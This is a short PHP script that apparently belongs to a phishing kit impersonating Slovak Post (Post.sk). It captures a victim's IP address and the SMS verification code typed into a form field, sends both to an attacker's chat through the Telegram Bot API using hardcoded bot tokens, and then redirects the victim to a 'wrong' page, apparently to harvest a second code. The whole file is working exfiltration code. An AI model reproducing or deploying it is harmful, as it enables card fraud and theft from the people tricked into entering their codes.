<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = " ---[ Post.sk_SMS ]--- \n";
$message .= " + IP   : $ip \n";
$message .= " + SMS : ".$_POST['ccSMS']." \n\n";
$message .= "-------------- IP Infos ------------\n";
$token = "5351808312:AAGmAZu-SQtzFG98etOdtDAp4YlNPrauaJ8";
$data = [
    'text' => $message,
    'chat_id' => '-852363990'
];

file_get_contents("https://api.telegram.org/bot5367411588:AAGqu6MHQKUUGDiIJiCmedTB8MmXjrWmsaw/sendMessage?" . http_build_query($data) );



header("Location: wrong/");?>
